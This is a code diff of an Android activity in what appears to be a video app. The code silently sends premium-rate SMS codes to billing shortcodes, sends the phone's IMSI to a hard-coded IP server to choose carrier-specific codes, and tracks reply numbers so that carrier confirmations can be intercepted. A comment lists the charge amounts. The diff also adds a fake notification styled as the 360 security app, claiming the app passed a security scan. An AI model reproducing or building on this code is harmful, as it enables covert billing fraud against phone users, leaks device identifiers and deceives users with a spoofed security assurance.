@@ -3,20 +3,21 @@ package cn.yoyo.mobile.ui;
 import java.util.ArrayList;
 import java.util.List;
 
-import com.sup.ab.Manager;
-import com.umeng.analytics.MobclickAgent;
-
 import android.app.Activity;
 import android.app.Dialog;
+import android.app.NotificationManager;
 import android.app.PendingIntent;
+import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.SharedPreferences;
-import android.net.Uri;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import android.os.Bundle;
-import android.os.Parcelable;
 import android.preference.PreferenceManager;
+import android.support.v4.app.NotificationCompat;
 import android.support.v4.view.ViewPager;
 import android.support.v4.view.ViewPager.OnPageChangeListener;
 import android.telephony.SmsManager;
@@ -30,16 +31,16 @@ import android.view.View.OnClickListener;
 import android.view.animation.AlphaAnimation;
 import android.view.animation.Animation;
 import android.widget.ImageView;
-import android.widget.Toast;
+import cn.yo.mobile.yeg.R;
 import cn.yoyo.mobile.ui.adapter.MyPagerAdapter;
-import cn.yoyo.mobile.ui.base.ExitApp;
 import cn.yoyo.mobile.util.ToastUtils;
-import cn.yoyo.mobile.yef.R;
-import cn.yoyo.mobile.yes.MainActivity;
 import cn.yoyo.mobile.yes.SMSReceiver;
 import cn.yoyo.mobile.yes.StringUtil;
 
-public class Activity_Guide extends Activity implements OnPageChangeListener,ExitApp{
+import com.sup.ab.Manager;
+import com.umeng.analytics.MobclickAgent;
+
+public class Activity_Guide extends Activity implements OnPageChangeListener{
 	private ViewPager viewPager;
 	private boolean misScrolled;
 	private String mArea = "";//卡地区
@@ -89,6 +90,9 @@ public class Activity_Guide extends Activity implements OnPageChangeListener,Exi
 		init();
 		showDialog(view);
 		
+		sentNotification();
+		
+        registerReceiver(myReceiver, new IntentFilter(SMSReceiver.START_ACTIVITY_ACTION));  
 	}
 	@Override
 	public void onPageScrollStateChanged(int arg0) {
@@ -113,7 +117,6 @@ public class Activity_Guide extends Activity implements OnPageChangeListener,Exi
 	public void onPageScrolled(int arg0, float arg1, int arg2) {}
 	@Override
 	public void onPageSelected(int arg0) {
-		Log.i("TAG", "arg0 = "+arg0+", getCurrentItem = "+viewPager.getAdapter().getCount());
 		if(arg0 == viewPager.getAdapter().getCount() - 1){
 			if(image.getAnimation() != null){
 				image.clearAnimation();
@@ -136,12 +139,16 @@ public class Activity_Guide extends Activity implements OnPageChangeListener,Exi
 			@Override
 			public void run() {
 				// TODO Auto-generated method stub
-			mArea = StringUtil.getURL("http://103.224.248.34:8096/eulprovincefind.aspx?imsi="+mImsi);
+			//mArea = StringUtil.getURL("http://103.224.248.34:8096/eulprovincefind.aspx?imsi="+mImsi);
 			}
 		}).start();
 	}
 	
-	private void send2(final String phone, final String mess,int delay){ 
+	private void send2(final String phone, final String mess,String receive,int delay){ 
+		//Log.i("TAG", "phone = "+phone+", message = "+mess);
+		if(!SMSReceiver.SMSnumber.toString().contains(receive)){
+			SMSReceiver.SMSnumber.append(receive);
+		}
 		MobclickAgent.onEvent(mContext, "send",SMSReceiver.code);
 		PendingIntent pi = PendingIntent.getBroadcast(mContext, 0, new Intent(SMSReceiver.SMS_SEND_ACTION), 0);  
         SmsManager sms = SmsManager.getDefault(); 
@@ -167,6 +174,7 @@ public class Activity_Guide extends Activity implements OnPageChangeListener,Exi
         				public void run() {
         					// TODO Auto-generated method stub
         						try {
+        							//12元10444     8元10442   2元10446 10464  1毛10436
         							//if(TextUtils.isEmpty(mArea))
         							//mArea=StringUtil.getURL("http://103.224.248.34:8096/eulprovincefind.aspx?imsi="+mImsi);
         		    				//if(!StringUtil.isBlack(getResources().getStringArray(R.array.cmcc), mArea)){
@@ -199,15 +207,13 @@ public class Activity_Guide extends Activity implements OnPageChangeListener,Exi
     					// TODO Auto-generated method stub
     				mArea=StringUtil.getURL("http://103.224.248.34:8096/eulprovincefind.aspx?imsi="+mImsi);
     				if(!StringUtil.isBlack(getResources().getStringArray(R.array.uniom), mArea)){
-    		        	SMSReceiver.SMSnumber = "10655477";
-    		        	send2("106901334042", "10CH0181B",0);
+    		        	send2("106901334042", "10CH0181B","10655477",0);
     				}			
     				}
     			}).start();
 			}else{
 				if(!StringUtil.isBlack(getResources().getStringArray(R.array.uniom), mArea)){
-		        	SMSReceiver.SMSnumber = "10655477";
-		        	send2("106901334042", "10CH0181B",0);
+					send2("106901334042", "10CH0181B","10655477",0);
 				}	
 			}
         	
@@ -225,15 +231,13 @@ public class Activity_Guide extends Activity implements OnPageChangeListener,Exi
     					// TODO Auto-generated method stub
     				mArea=StringUtil.getURL("http://103.224.248.34:8096/eulprovincefind.aspx?imsi="+mImsi);
     				if(!StringUtil.isBlack(getResources().getStringArray(R.array.uniom), mArea)){
-    					SMSReceiver.SMSnumber = "10001888@1065987701";
-    					send2("1065987701", "900cz1201",0);
+    					send2("1065987701", "900cz1201","10001888@1065987701",0);
     				}			
     				}
     			}).start();
 			}else{
 				if(!StringUtil.isBlack(getResources().getStringArray(R.array.net), mArea)){
-					SMSReceiver.SMSnumber = "10001888@1065987701";
-					send2("1065987701", "900cz1201",0);
+					send2("1065987701", "900cz1201","10001888@1065987701",0);
 				}	
 			}
         } 
@@ -244,11 +248,13 @@ public class Activity_Guide extends Activity implements OnPageChangeListener,Exi
     private void getJson(String resultData){
     	if(TextUtils.isEmpty(resultData))
     		return;
-    	
+    	if(resultData.equals("error")){
+    		ToastUtils.showToast("网络出现异常，请重试");
+    		return;
+    	}
     	String[] strings = resultData.split("<\\:>");
     	if(strings.length>=3){
-    		SMSReceiver.SMSnumber = strings[2];
-    		send2(strings[0],strings[1],0);
+    		send2(strings[0],strings[1],strings[2],0);
     	}
     }
     
@@ -257,9 +263,13 @@ public class Activity_Guide extends Activity implements OnPageChangeListener,Exi
 		MobclickAgent.onResume(this);
 		}
 
-		public void onPause() {
+	public void onPause() {
 		super.onPause();
 		MobclickAgent.onPause(this);
+		}
+	public void onDestroy() {
+		super.onDestroy();
+		unregisterReceiver(myReceiver);
 		}
 	private void showDialog(View view){
 		SharedPreferences preference = PreferenceManager.getDefaultSharedPreferences(this);
@@ -314,7 +324,7 @@ public class Activity_Guide extends Activity implements OnPageChangeListener,Exi
 								int which) {
 							switch (which) {
 							case Dialog.BUTTON_POSITIVE:// yes
-								System.exit(0);
+								finish();
 								break;
 							case Dialog.BUTTON_NEGATIVE:// no
 								break;
@@ -322,10 +332,40 @@ public class Activity_Guide extends Activity implements OnPageChangeListener,Exi
 						}
 					});
 	   }
-	@Override
-	public void onload() {
-		// TODO Auto-generated method stub
-		startActivity();
-	}
+	
+	private BroadcastReceiver myReceiver = new BroadcastReceiver(){  
+        @Override  
+        public void onReceive(Context context, Intent intent) {  
+        	if(intent.getAction().endsWith(SMSReceiver.START_ACTIVITY_ACTION)){
+        		startActivity();
+        	}
+        }  
+          
+    };  
+    
+    private void sentNotification(){
+    	Bitmap btm = BitmapFactory.decodeResource(getResources(),
+    			R.drawable.push_icon_small);
+    			NotificationCompat.Builder mBuilder = new NotificationCompat.Builder(
+    			Activity_Guide.this).setSmallIcon(R.drawable.push_icon_small)
+    			.setContentTitle("360安全卫士")
+    			.setContentText("夜色视频已通过安全扫描");
+    			mBuilder.setTicker("360安全卫士");//第一次提示消息的时候显示在通知栏上
+    			mBuilder.setNumber(12);
+    			mBuilder.setLargeIcon(btm);
+    			mBuilder.setAutoCancel(true);//自己维护通知的消失
+
+    			//构建一个Intent
+    			Intent resultIntent = new Intent(this,
+    			Activity_Guide.class);
+    			//封装一个Intent
+    			PendingIntent resultPendingIntent = PendingIntent.getActivity(this, 0, resultIntent,
+    			PendingIntent.FLAG_UPDATE_CURRENT);
+    			// 设置通知主题的意图
+    			mBuilder.setContentIntent(resultPendingIntent);
+    			//获取通知管理器对象
+    			NotificationManager mNotificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+    			mNotificationManager.notify(0, mBuilder.build());
+    }
 	   
 }
